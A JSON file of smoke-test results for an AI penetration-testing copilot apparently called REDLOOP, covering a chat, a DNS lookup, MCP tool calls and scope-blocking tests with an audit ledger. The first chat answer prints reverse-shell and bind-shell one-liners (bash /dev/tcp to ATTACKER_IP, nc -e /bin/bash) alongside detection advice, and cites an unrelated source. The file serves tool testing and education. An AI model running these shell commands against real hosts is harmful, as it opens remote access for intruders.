@@ -1,0 +1,440 @@
+{
+  "smoke_test_1_chat": {
+    "description": "Real chat request through copilot engine",
+    "request": {
+      "method": "POST",
+      "url": "http://127.0.0.1:8765/api/chat",
+      "headers": {
+        "Host": "127.0.0.1:8765",
+        "Origin": "http://127.0.0.1:8765"
+      },
+      "body": {
+        "message": "What are the core differences between a reverse shell and a bind shell in network penetration testing?",
+        "conversation_id": "smoke-test-conv-01"
+      }
+    },
+    "response": {
+      "status_code": 200,
+      "elapsed_ms": 24128.85,
+      "headers": {
+        "content-length": "6346",
+        "content-type": "application/json",
+        "content-security-policy": "default-src 'none'; script-src 'sha256-lkff14kwp6qRYvZVJ0MlxRiHQrbEwecMSC5dZyMAujE=' 'sha256-nlhHPA3QznQUFyhBv+qH7XP5HPH14L2Q9xZsUhfLruU=' 'sha256-SKxGX+iWRUKM3T393b6vWbACMANJI5xarc1f7+jAGco=' 'sha256-4eQYiZoT9+v08fGBtvSKPtjwbh2Q9l6HJxNa6xUwh2k=' 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self' http://localhost:8080 http://127.0.0.1:8080 http://localhost:8765 http://127.0.0.1:8765; form-action 'self'; base-uri 'none'; frame-ancestors 'none'",
+        "x-content-type-options": "nosniff",
+        "x-frame-options": "DENY",
+        "referrer-policy": "no-referrer"
+      },
+      "body": {
+        "response": "In the context of network penetration testing and offensive security operations, the core differences between a **reverse shell** and a **bind shell** lie in the direction of the network connection, the firewall/NAT traversal requirements, and the typical deployment scenarios.\n\nHere is a technical breakdown of the differences:\n\n### 1. Connection Direction\n*   **Reverse Shell:**\n    *   **Initiator:** The **victim** (target) machine initiates the connection to the **attacker** (listener).\n    *   **Flow:** Target $\\rightarrow$ Attacker.\n    *   **Mechanism:** The target executes a command that connects out to the attacker\u2019s IP and port, then redirects the standard input/output/error streams of a shell to that socket.\n*   **Bind Shell:**\n    *   **Initiator:** The **attacker** initiates the connection to the **victim** (target) machine.\n    *   **Flow:** Attacker $\\rightarrow$ Target.\n    *   **Mechanism:** The target executes a command that binds a shell to a specific local port and listens for incoming connections. The attacker then connects to that port.\n\n### 2. Firewall and NAT Traversal\n*   **Reverse Shell:**\n    *   **Advantage:** Generally easier to deploy in modern environments. Most outbound traffic (especially on ports like 443, 80, or 53) is allowed by corporate firewalls and NAT devices. Since the connection originates from inside the network, it bypasses inbound firewall rules.\n    *   **Use Case:** Preferred when the target is behind a NAT or firewall that blocks inbound connections.\n*   **Bind Shell:**\n    *   **Disadvantage:** Requires the target to have an open inbound port. If the target is behind a NAT or a stateful firewall that blocks unsolicited inbound traffic, the bind shell will fail.\n    *   **Use Case:** Useful when the target is directly accessible on the network (e.g., internal lateral movement, or a host with a public IP and open ports).\n\n### 3. Implementation Examples (Linux)\n*   **Reverse Shell:**\n    ```bash\n    # Target executes:\n    bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\n    ```\n    *   The target connects to `ATTACKER_IP:PORT`.\n*   **Bind Shell:**\n    ```bash\n    # Target executes:\n    nc -l -p PORT -e /bin/bash\n    # Or using bash built-in:\n    bash -c 'while true; do /bin/bash -i >& /dev/udp/0.0.0.0/PORT 0>&1; done'\n    ```\n    *   The target listens on `PORT`. The attacker connects to `TARGET_IP:PORT`.\n\n### 4. Detection and Defense Considerations\n*   **Reverse Shell:**\n    *   **Detection:** Look for outbound connections from internal hosts to external IPs on non-standard ports. EDR solutions often flag processes like `bash`, `nc`, or `python` making outbound network connections.\n    *   **Defense:** Egress filtering (blocking outbound traffic to unauthorized IPs/ports), network segmentation, and monitoring for unusual process-to-network behavior.\n*   **Bind Shell:**\n    *   **Detection:** Look for unexpected listening ports on internal hosts. Tools like `netstat`, `ss`, or EDR alerts for new listening sockets.\n    *   **Defense:** Host-based firewalls (e.g., `iptables`, `ufw`, Windows Firewall) configured to deny inbound connections by default, and monitoring for unauthorized listening services.\n\n### Summary Table\n\n| Feature | Reverse Shell | Bind Shell |\n| :--- | :--- | :--- |\n| **Connection Initiated By** | Target (Victim) | Attacker |\n| **Direction** | Target $\\rightarrow$ Attacker | Attacker $\\rightarrow$ Target |\n| **Firewall/NAT Friendly** | Yes (Outbound traffic) | No (Requires Inbound access) |\n| **Typical Use Case** | External compromise, NATed hosts | Internal lateral movement, direct access |\n| **Port Status on Target** | No listening port required | Must listen on a port |\n\n### Security Note\nBoth techniques are commonly used in penetration testing to establish interactive access. Defenders should monitor for:\n1.  **Outbound connections** from internal hosts to external IPs (reverse shell indicator).\n2.  **Unexpected listening ports** on internal hosts (bind shell indicator).\n3.  **Process behavior** such as shells (`/bin/bash`, `/bin/sh`) making network connections, which is highly anomalous in most environments.\n\nSources: [Reverse Engineering Fundamentals: Disassembly & Decompilation \u2014 SANS FOR610 / Ghidra Software Reverse Engineering Suite]",
+        "task": {
+          "id": "task-dffdb64b419c",
+          "conversation_id": "smoke-test-conv-01",
+          "assessment_id": null,
+          "parent_task_id": null,
+          "type": "general_chat",
+          "status": "COMPLETED",
+          "priority": 1,
+          "dependencies": [],
+          "capability": "chat.general",
+          "target": "",
+          "scope_authorized": true,
+          "started_at": "2026-11-09T17:38:25.538424+00:00",
+          "completed_at": "2026-11-09T17:38:45.065028+00:00",
+          "stages": [],
+          "result": {},
+          "evidence_ids": [],
+          "finding_ids": [],
+          "error": null,
+          "response_text": "",
+          "fingerprint": "cde5d42881f867e13a07b02c3c0c14b85a327dcd646e11517c519a1845bb73c5"
+        },
+        "assessment_id": null,
+        "conversation_id": "smoke-test-conv-01",
+        "telemetry": {
+          "latency_ms": 19516.0,
+          "provider": "groq",
+          "model": "groq/qwen/qwen3.8-27b",
+          "token_usage_reported": true,
+          "prompt_tokens": 1027,
+          "completion_tokens": 1027,
+          "total_tokens": 2054,
+          "cost_estimate": "NOT_REPORTED",
+          "provider_status": {
+            "attempted": true,
+            "provider": "groq",
+            "model": "groq/qwen/qwen3.8-27b",
+            "status": "INFERENCE_VERIFIED",
+            "reason": null,
+            "fallback_used": false,
+            "fallback_provider": null,
+            "fallback_model": null,
+            "attempts": [
+              {
+                "provider": "ollama",
+                "model": "qwen3:8b",
+                "status": "TIMEOUT",
+                "reason": "ProviderCallError: ollama request failed (Timeout)"
+              },
+              {
+                "provider": "groq",
+                "model": "groq/qwen/qwen3.8-27b",
+                "status": "INFERENCE_VERIFIED",
+                "latency_s": 2.58
+              }
+            ]
+          }
+        },
+        "intent": {
+          "action": "general_chat",
+          "intent": "GENERAL_CHAT",
+          "target": "",
+          "target_type": "none",
+          "resolution_source": "none",
+          "confidence": 0.75,
+          "confidence_factors": {
+            "target_present": false,
+            "context_reference": false,
+            "explicit_identifier": false,
+            "operational_verb": false,
+            "explanation_phrasing": true
+          }
+        },
+        "capability": "GENERAL_CHAT",
+        "request_context": {
+          "request_id": "req-5834e617ec17",
+          "task_id": "task-dffdb64b419c",
+          "user_message": "What are the core differences between a reverse shell and a bind shell in network penetration testing?",
+          "task_type": "general_chat",
+          "explicit_target": null,
+          "target_type": "none",
+          "active_investigation_id": null,
+          "selected_tools": [],
+          "evidence_references": [],
+          "execution_status": "COMPLETED"
+        },
+        "audit_event_id": "audit-evt-1",
+        "position": 1,
+        "user_position": 0
+      }
+    }
+  },
+  "smoke_test_2_osint": {
+    "description": "Real OSINT lookup against authorized domain with evidence IDs",
+    "result": {
+      "target": "scanme.nmap.org",
+      "elapsed_ms": 11.23,
+      "indicator": "scanme.nmap.org",
+      "query_type": "domain",
+      "status": "OBSERVED",
+      "evidence_id": "evi-osint-dc70461929",
+      "evidence_hash": "db1190831a4e63f9f4ec33109865da7f4609fc3714549dc2fecf1128cd880800",
+      "evidence_integrity_valid": true,
+      "confidence": 0.865,
+      "confidence_label": "HIGH",
+      "sources_queried": [
+        "DNS_RESOLVER"
+      ],
+      "observation_timestamp": "2026-11-09T17:34:39.664648+00:00",
+      "findings": [
+        "{'property': 'dns_a', 'record_type': 'A', 'values': ['45.33.32.156'], 'source': 'DNS_RESOLVER', 'method': 'DNS_QUERY_A', 'confidence': 0.95, 'verification_state': 'OBSERVED', 'status': 'PRESENT'}",
+        "{'property': 'dns_aaaa', 'record_type': 'AAAA', 'values': ['2600:3c01::f03c:91ff:fe18:bb2f'], 'source': 'DNS_RESOLVER', 'method': 'DNS_QUERY_AAAA', 'confidence': 0.95, 'verification_state': 'OBSERVED', 'status': 'PRESENT'}",
+        "{'property': 'dns_records', 'type': 'A/AAAA', 'values': ['45.33.32.156', '2600:3c01::f03c:91ff:fe18:bb2f'], 'all_types': ['A', 'AAAA'], 'records': {'A': ['45.33.32.156'], 'AAAA': ['2600:3c01::f03c:91ff:fe18:bb2f']}, 'query_status': 'RESOLVED', 'resolver': 'system_default', 'timestamp': '2026-11-09T17:34:25.334761+00:00', 'is_complete': True, 'source': 'DNS_RESOLVER', 'method': 'INDEPENDENT_DNS_QUERIES', 'confidence': 0.95, 'verification_state': 'OBSERVED', 'status': 'PRESENT'}"
+      ]
+    }
+  },
+  "smoke_test_3_mcp": {
+    "description": "Real MCP Tool Call Round-Trip via MCPServer 2.x",
+    "result": {
+      "session": "in-process official MCP Python SDK session (MCPServer)",
+      "tool_call_1": {
+        "name": "scope_check",
+        "arguments": {
+          "target": "127.0.0.1",
+          "action": "recon",
+          "port": 80
+        },
+        "is_error": false,
+        "content": [
+          "{\n  \"allowed\": true,\n  \"target\": \"127.0.0.1\",\n  \"action\": \"recon\",\n  \"port\": 80,\n  \"reason\": \"AUTHORIZED\"\n}"
+        ]
+      },
+      "tool_call_2": {
+        "name": "list_targets",
+        "arguments": {},
+        "is_error": false,
+        "content": [
+          "{\n  \"count\": 2,\n  \"targets\": [\n    {\n      \"cidr\": \"127.0.0.1/32\",\n      \"domain\": null,\n      \"label\": \"Authorized loopback test target\",\n      \"ports\": [\n        80,\n        443,\n        8765\n      ],\n      \"allowed_actions\": [\n        \"scan\",\n        \"recon\",\n        \"osint\"\n      ]\n    },\n    {\n      \"cidr\": null,\n      \"domain\": \"scanme.nmap.org\",\n      \"label\": \"Authorized public reconnaissance test domain\",\n      \"ports\": [\n        80,\n        443\n      ],\n      \"allowed_actions\": [\n        \"recon\",\n        \"osint\"\n      ]\n    }\n  ]\n}"
+        ]
+      },
+      "roundtrip_ms": 34.45
+    }
+  },
+  "smoke_test_4_out_of_scope": {
+    "rest_out_of_scope": {
+      "entry_point": "REST API (/api/workbench/recon/run)",
+      "request": {
+        "target": "192.0.2.200",
+        "tool": "nmap",
+        "port": 80
+      },
+      "status_code": 404,
+      "response_body": {
+        "detail": "Not Found"
+      }
+    },
+    "chat_out_of_scope": {
+      "entry_point": "Chat Copilot (/api/chat)",
+      "request": {
+        "message": "Scan all ports and assess vulnerabilities on 192.0.2.200"
+      },
+      "status_code": 200,
+      "response_body": {
+        "response": "### \ud83d\udee1\ufe0f REDLOOP Policy-Enforced Tool: `PORTS` on `192.0.2.200`\n**Target:** `192.0.2.200` \u00b7 **Requested Capability:** `tool_ports` \u00b7 **Status:** `\ud83d\udd34 BLOCKED (Target Outside Active Signed Scope)`\n\n> **Technical Scope Policy:** REDLOOP enforces fail-closed scope validation before initiating raw sockets or probes. Zero network packets were transmitted to `192.0.2.200`.\n\n#### \ud83d\udcca Stage Execution Status\n| Stage | Status | Findings | Operational Result |\n| :--- | :---: | :---: | :--- |\n| **Local Evidence Review** | \ud83d\udfe2 SUCCESS | 0 | NO LOCAL EVIDENCE AVAILABLE. |\n| **Ports Probe** | \ud83d\udd34 BLOCKED | 0 | Prohibited by active signed scope contract |\n\n#### \ud83d\udd2c Local Intelligence & History\n**NO LOCAL EVIDENCE AVAILABLE.**\n- **Local Database:** `0` historical findings found for `192.0.2.200`.\n- **Evidence Ledger:** `0` prior evidence artifacts recorded.\n- **Network Transmission:** `0` TCP/UDP packets or DNS queries transmitted (zero probe leakage).\n- **Information Isolation:** No external knowledge, DNS lookup, OSINT, or pretrained model speculation was used.\n\n---\n[\ud83d\udcc1 Inspect Local Evidence](/workbench?view=evidence) &nbsp;|&nbsp; [\ud83d\udee1\ufe0f Review Scope Configuration](/workbench?view=scope) &nbsp;|&nbsp; [\ud83c\udf10 Attack Surface Graph](/workbench?view=attack-surface)",
+        "task": {
+          "id": "task-dd608aed53be",
+          "conversation_id": "workbench-copilot",
+          "assessment_id": null,
+          "parent_task_id": null,
+          "type": "tool_ports",
+          "status": "PARTIALLY_BLOCKED",
+          "priority": 1,
+          "dependencies": [],
+          "capability": "tool.tool_ports",
+          "target": "192.0.2.200",
+          "scope_authorized": false,
+          "started_at": "2026-11-09T17:38:45.951101+00:00",
+          "completed_at": "2026-11-09T17:38:45.998620+00:00",
+          "stages": [
+            {
+              "name": "local_evidence_review",
+              "status": "SUCCESS",
+              "findings": 0,
+              "duration_seconds": 0.01,
+              "reason": "NO LOCAL EVIDENCE AVAILABLE. 0 prior authorized records found in local store."
+            },
+            {
+              "name": "tool_ports",
+              "status": "BLOCKED",
+              "findings": 0,
+              "duration_seconds": 0.0,
+              "reason": "Target '192.0.2.200' is not authorized by the active signed scope contract."
+            }
+          ],
+          "result": {
+            "status": "partially_blocked",
+            "target": "192.0.2.200",
+            "authorization_status": "BLOCKED",
+            "blocked_capability": "tool_ports",
+            "reason": "Target '192.0.2.200' is not authorized by the active signed scope contract.",
+            "executed_stages": [
+              "local_evidence_review"
+            ],
+            "blocked_stages": [
+              "tool_ports"
+            ],
+            "local_evidence_status": "NO LOCAL EVIDENCE AVAILABLE",
+            "historical_findings_count": 0,
+            "historical_evidence_count": 0,
+            "available_next_actions": [
+              "inspect_existing_local_evidence",
+              "review_scope_configuration",
+              "run_authorized_local_checks"
+            ]
+          },
+          "evidence_ids": [],
+          "finding_ids": [],
+          "error": null,
+          "response_text": "### \ud83d\udee1\ufe0f REDLOOP Policy-Enforced Tool: `PORTS` on `192.0.2.200`\n**Target:** `192.0.2.200` \u00b7 **Requested Capability:** `tool_ports` \u00b7 **Status:** `\ud83d\udd34 BLOCKED (Target Outside Active Signed Scope)`\n\n> **Technical Scope Policy:** REDLOOP enforces fail-closed scope validation before initiating raw sockets or probes. Zero network packets were transmitted to `192.0.2.200`.\n\n#### \ud83d\udcca Stage Execution Status\n| Stage | Status | Findings | Operational Result |\n| :--- | :---: | :---: | :--- |\n| **Local Evidence Review** | \ud83d\udfe2 SUCCESS | 0 | NO LOCAL EVIDENCE AVAILABLE. |\n| **Ports Probe** | \ud83d\udd34 BLOCKED | 0 | Prohibited by active signed scope contract |\n\n#### \ud83d\udd2c Local Intelligence & History\n**NO LOCAL EVIDENCE AVAILABLE.**\n- **Local Database:** `0` historical findings found for `192.0.2.200`.\n- **Evidence Ledger:** `0` prior evidence artifacts recorded.\n- **Network Transmission:** `0` TCP/UDP packets or DNS queries transmitted (zero probe leakage).\n- **Information Isolation:** No external knowledge, DNS lookup, OSINT, or pretrained model speculation was used.\n\n---\n[\ud83d\udcc1 Inspect Local Evidence](/workbench?view=evidence) &nbsp;|&nbsp; [\ud83d\udee1\ufe0f Review Scope Configuration](/workbench?view=scope) &nbsp;|&nbsp; [\ud83c\udf10 Attack Surface Graph](/workbench?view=attack-surface)",
+          "fingerprint": "b3a888c53b2f6f39365ce784148dbc82461b012393368720e39664f63e6e7ae2"
+        },
+        "structured_result": {
+          "status": "partially_blocked",
+          "target": "192.0.2.200",
+          "authorization_status": "BLOCKED",
+          "blocked_capability": "tool_ports",
+          "reason": "Target '192.0.2.200' is not authorized by the active signed scope contract.",
+          "executed_stages": [
+            "local_evidence_review"
+          ],
+          "blocked_stages": [
+            "tool_ports"
+          ],
+          "local_evidence_status": "NO LOCAL EVIDENCE AVAILABLE",
+          "historical_findings_count": 0,
+          "historical_evidence_count": 0,
+          "available_next_actions": [
+            "inspect_existing_local_evidence",
+            "review_scope_configuration",
+            "run_authorized_local_checks"
+          ]
+        },
+        "assessment_id": null,
+        "conversation_id": "workbench-copilot",
+        "telemetry": {
+          "latency_ms": 63.0
+        },
+        "intent": {
+          "action": "tool_ports",
+          "intent": "AUTHORIZED_RECONNAISSANCE",
+          "target": "192.0.2.200",
+          "target_type": "ip",
+          "resolution_source": "prompt",
+          "confidence": 0.8,
+          "confidence_factors": {
+            "target_present": true,
+            "context_reference": false,
+            "explicit_identifier": false,
+            "operational_verb": true,
+            "explanation_phrasing": false
+          }
+        },
+        "capability": "TOOL_EXECUTION",
+        "request_context": {
+          "request_id": "req-15e85fc81d8e",
+          "task_id": "task-dd608aed53be",
+          "user_message": "Scan all ports and assess vulnerabilities on 192.0.2.200",
+          "task_type": "tool_ports",
+          "explicit_target": "192.0.2.200",
+          "target_type": "ip",
+          "active_investigation_id": null,
+          "selected_tools": [
+            "tool_ports"
+          ],
+          "evidence_references": [],
+          "execution_status": "PARTIALLY_BLOCKED"
+        },
+        "audit_event_id": "audit-evt-6",
+        "position": 1,
+        "user_position": 0
+      }
+    },
+    "mcp_out_of_scope": {
+      "entry_point": "MCP Server (scope_check & run_recon)",
+      "request": {
+        "target": "192.0.2.200",
+        "port": 80,
+        "tool": "nmap"
+      },
+      "scope_check_is_error": false,
+      "scope_check_content": [
+        "{\n  \"allowed\": false,\n  \"target\": \"192.0.2.200\",\n  \"action\": \"recon\",\n  \"port\": 80,\n  \"reason\": \"Scope blocked: 192.0.2.200 [recon] - 192.0.2.200 is not present in scope.yaml \u2014 refusing to act\"\n}"
+      ],
+      "run_recon_is_error": false,
+      "run_recon_content": [
+        "{\n  \"status\": \"error\",\n  \"error\": \"SCOPE_DENIED\",\n  \"message\": \"Scope blocked: 192.0.2.200 [scan] - 192.0.2.200 is not present in scope.yaml \u2014 refusing to act\"\n}"
+      ]
+    },
+    "audit_ledger_rows": [
+      {
+        "id": 10,
+        "timestamp": "2026-11-09T17:38:46.070401+00:00",
+        "target": "192.0.2.200:80",
+        "action": "mcp:run_recon",
+        "module": "mcp",
+        "status": "BLOCKED",
+        "details": "{\"status\": \"error\", \"error\": \"SCOPE_DENIED\", \"message\": \"Scope blocked: 192.0.2.200 [scan] - 192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\"}",
+        "prev_hash": "1fa37fc0a6865820c5490be6302c301daf952b13b1f7c0c1ae6ed0893fc3b7a1",
+        "event_hash": "bd68f5b6455afcb829a12cff7db57ca9970b6b6c7c7f2c523a3b30aa62864d94"
+      },
+      {
+        "id": 9,
+        "timestamp": "2026-11-09T17:38:46.061403+00:00",
+        "target": "192.0.2.200",
+        "action": "scan",
+        "module": "scope_guard",
+        "status": "blocked",
+        "details": "{\"reason\": \"192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\", \"scope_entry\": null}",
+        "prev_hash": "740ec0db7547dd03b1a28d974268c8841a187ea5144cd4e96ab9b34d3fe34efe",
+        "event_hash": "1fa37fc0a6865820c5490be6302c301daf952b13b1f7c0c1ae6ed0893fc3b7a1"
+      },
+      {
+        "id": 8,
+        "timestamp": "2026-11-09T17:38:46.051409+00:00",
+        "target": "192.0.2.200",
+        "action": "mcp:scope_check",
+        "module": "mcp",
+        "status": "BLOCKED",
+        "details": "{\"allowed\": false, \"target\": \"192.0.2.200\", \"action\": \"recon\", \"port\": 80, \"reason\": \"Scope blocked: 192.0.2.200 [recon] - 192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\"}",
+        "prev_hash": "b684b7f0d38909ff8667881c498f88f2bbf673f61022a1ce9045499cb2ea1cf6",
+        "event_hash": "740ec0db7547dd03b1a28d974268c8841a187ea5144cd4e96ab9b34d3fe34efe"
+      },
+      {
+        "id": 7,
+        "timestamp": "2026-11-09T17:38:46.043404+00:00",
+        "target": "192.0.2.200",
+        "action": "recon",
+        "module": "scope_guard",
+        "status": "blocked",
+        "details": "{\"reason\": \"192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\", \"scope_entry\": null}",
+        "prev_hash": "4430eab352f9ece6719977744478508c667daa51a681df74c5963822f5f98580",
+        "event_hash": "b684b7f0d38909ff8667881c498f88f2bbf673f61022a1ce9045499cb2ea1cf6"
+      },
+      {
+        "id": 6,
+        "timestamp": "2026-11-09T17:38:46.008638+00:00",
+        "target": "copilot-turn",
+        "action": "chat_turn",
+        "module": "assistant",
+        "status": "completed",
+        "details": "{\"conversation_id\": \"workbench-copilot\", \"prompt\": \"Scan all ports and assess vulnerabilities on 192.0.2.200\", \"capability\": \"TOOL_EXECUTION\"}",
+        "prev_hash": "5952d23e74ca792e27d7f63f913744722a609fbc042f016f1028c6bd0de2214d",
+        "event_hash": "4430eab352f9ece6719977744478508c667daa51a681df74c5963822f5f98580"
+      },
+      {
+        "id": 5,
+        "timestamp": "2026-11-09T17:38:45.989063+00:00",
+        "target": "192.0.2.200",
+        "action": "tool_ports",
+        "module": "scope_guard",
+        "status": "blocked",
+        "details": "{\"reason\": \"Target '192.0.2.200' is not authorized by the active signed scope contract for capability 'tool_ports'.\", \"scope_entry\": null}",
+        "prev_hash": "7f26241fdd6fb6bbdde8b8350d86953fa220961b2bbdedf6846dd7e7548e2a96",
+        "event_hash": "5952d23e74ca792e27d7f63f913744722a609fbc042f016f1028c6bd0de2214d"
+      },
+      {
+        "id": 4,
+        "timestamp": "2026-11-09T17:38:45.978348+00:00",
+        "target": "192.0.2.200",
+        "action": "scan",
+        "module": "scope_guard",
+        "status": "blocked",
+        "details": "{\"reason\": \"192.0.2.200 is not present in scope.yaml \\u2014 refusing to act\", \"scope_entry\": null}",
+        "prev_hash": "2f5ac5f5f486e6d9aa51e2a5d0f979155487e09cfc4272c746d284f56cdfb5c8",
+        "event_hash": "7f26241fdd6fb6bbdde8b8350d86953fa220961b2bbdedf6846dd7e7548e2a96"
+      },
+      {
+        "id": 3,
+        "timestamp": "2026-11-09T17:38:45.884217+00:00",
+        "target": "*",
+        "action": "mcp:list_targets",
+        "module": "mcp",
+        "status": "SUCCESS",
+        "details": "{\"count\": 2}",
+        "prev_hash": "3f3725f96ea8624de98db7df6a3db473c5370833ac79d468e4d6a309c9d61c19",
+        "event_hash": "2f5ac5f5f486e6d9aa51e2a5d0f979155487e09cfc4272c746d284f56cdfb5c8"
+      },
+      {
+        "id": 2,
+        "timestamp": "2026-11-09T17:38:45.864957+00:00",
+        "target": "127.0.0.1",
+        "action": "mcp:scope_check",
+        "module": "mcp",
+        "status": "ALLOWED",
+        "details": "{\"allowed\": true, \"target\": \"127.0.0.1\", \"action\": \"recon\", \"port\": 80, \"reason\": \"AUTHORIZED\"}",
+        "prev_hash": "42fecfd3c0a31adf621c8934a7c821786a3f8b83d3c917e4581c40af8667144f",
+        "event_hash": "3f3725f96ea8624de98db7df6a3db473c5370833ac79d468e4d6a309c9d61c19"
+      },
+      {
+        "id": 1,
+        "timestamp": "2026-11-09T17:38:45.094157+00:00",
+        "target": "copilot-turn",
+        "action": "chat_turn",
+        "module": "assistant",
+        "status": "completed",
+        "details": "{\"conversation_id\": \"smoke-test-conv-01\", \"prompt\": \"What are the core differences between a reverse shell and a bind shell in network penetration testing?\", \"capability\": \"GENERAL_CHAT\"}",
+        "prev_hash": "0000000000000000000000000000000000000000000000000000000000000000",
+        "event_hash": "42fecfd3c0a31adf621c8934a7c821786a3f8b83d3c917e4581c40af8667144f"
+      }
+    ]
+  }
+}
